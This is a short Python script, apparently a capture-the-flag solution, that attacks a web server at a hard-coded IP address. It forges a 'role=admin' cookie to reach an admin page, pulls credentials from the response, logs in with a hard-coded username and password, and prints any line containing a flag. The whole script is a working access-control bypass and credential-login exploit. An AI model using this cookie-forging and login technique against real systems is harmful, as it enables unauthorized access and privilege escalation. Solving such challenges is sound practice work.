import requests
session=requests.Session()

url="http://35.193.45.56/adminpower/"
payload={"Cookie":"role=admin"}
response=session.get(url,headers=payload)
headers=response.headers
content=response.text


# print(headers)
credentials=content.split('\n')[17]


username="support"
password="x34245323"

login_payload={"username":username,"password":password}
login=session.post(url,data=login_payload,headers=payload)
print(login.headers)

for line in (login.text).split('\n'):
	if 'flag' in line.lower():
		print(f'\n\n\nFLAG:{line.strip()}')